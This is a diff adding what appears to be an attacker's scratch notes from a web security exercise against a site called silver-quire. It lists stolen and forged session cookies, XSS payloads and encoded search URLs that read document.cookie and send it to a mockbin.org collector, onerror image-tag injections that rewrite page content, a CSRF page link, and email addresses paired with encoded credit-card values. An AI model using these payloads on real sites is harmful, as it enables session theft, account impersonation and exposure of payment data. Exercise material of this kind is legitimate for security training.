@@ -1,0 +1,79 @@
+﻿ZXlKMWMyVnlYMmxrSWpvM01uMA==
+
+ZXlKMWMyVnlYMmxrSWpvM01uMA
+
+eyJ1c2VyX2lkIjo3MX0	
+
+
+ZXlKMWMyVnlYMmxrSWpvM01YMA
+
+ZXlKMWMyVnlYMmxrSWpvM00zMA
+
+
+eyJ1c2VyX2lkIjo1OX0=
+
+2->
+
+eyJ1c2VyX2lkIjo3MX0--084bc54198ea110927cdaa0830ea27cc
+eyJ1c2VyX2lkIjo3MX0--084bc54198ea110927cdaa0830ea27cc
+
+eyJ1c2VyX2lkIjo3MX0--084bc54198ea110927cdaa0830ea27cc
+
+eyJ1c2VyX2lkIjo3MX0--084bc54198ea110927cdaa0830ea27cc
+
+
+
+eyJ1c2VyX2lkIjo3MX0--084bc54198ea110927cdaa0830ea27cc
+
+
+<script>var aha = document.cookie;$.get("https://mockbin.org/bin/2de61b8f-2eb5-4091-a3b5-39b81126984d?data="+aha");</script>
+
+
+<script>$.get("https://mockbin.org/bin/2de61b8f-2eb5-4091-a3b5-39b81126984d?data="+document.cookie);</script>
+
+
+http://silver-quire.herokuapp.com/search?query=%3Cscript%3E$.get(%22https://mockbin.org/bin/2de61b8f-2eb5-4091-a3b5-39b81126984d?data=%22+document.cookie);%3C/script%3E
+
+
+
+<script>$.get("https://mockbin.org/bin/2de61b8f-2eb5-4091-a3b5-39b81126984d?data="+document.cookie);</script>
+http://silver-quire.herokuapp.com/search?query=%3Cscript%3E%24.get%28%22https%3A%2F%2Fmockbin.org%2Fbin%2F2de61b8f-2eb5-4091-a3b5-39b81126984d%3Fdata%3D%22%2Bdocument.cookie%29%3B%3C%2Fscript%3E
+
+http://silver-quire.herokuapp.com/search?query=%3Cscript%3E%24.get%28%22https%3A%2F%2Fmockbin.org%2Fbin%2F2de61b8f-2eb5-4091-a3b5-39b81126984d%3Fdata%3D%22%2Bdocument.cookie%29%3B%3C%2Fscript%3E
+http://silver-quire.herokuapp.com/search?query=%3Cscript%3E%24.get%28%22https%3A%2F%2Fmockbin.org%2Fbin%2F2de61b8f-2eb5-4091-a3b5-39b81126984d%3Fdata%3D%22%2Bdocument.cookie%29%3B%3C%2Fscript%3E
+
+$.cookie("session", "eyJ1c2VyX2lkIjo1OX0--26ad05807507b9b8abe995c41b49b4ddf213c925");
+document.cookie = "session=eyJ1c2VyX2lkIjo1OX0--26ad05807507b9b8abe995c41b49b4ddf213c925";
+
+
+select * from book where id = 1
+
+
+<img src="image.gif" onerror="function() {$('.book-comment').text('great book');}()" />
+
+<img src="image.gif" onerror="(function () {$('.book-comment').text('great book');}());" />
+
+<script>$(function() {$(".book-comment").text("great book");});</script>
+
+document.cookie = "session=eyJ1c2VyX2lkIjo1OX0--26ad05807507b9b8abe995c41b49b4ddf213c925";
+
+
+
+
+function imgError(image) {
+    image.onerror = "";
+    image.src = "/images/noimage.gif";
+    return true;
+}
+<img src="image.png" onerror="javasctip"/>
+
+
+https://silver-quire.github.io/team-6/csrf.min.html
+
+<karatekutya>
+elia@hane.info
+	Credit card	kLuEkK6KkrCLjLSCkrefmbCAkg==
+annabel_donnelly@wolffrogahn.io
+	Credit card	lraDlK6EkraGjLCFlLCfmbSCmQ==
+	
+</karatekutya>
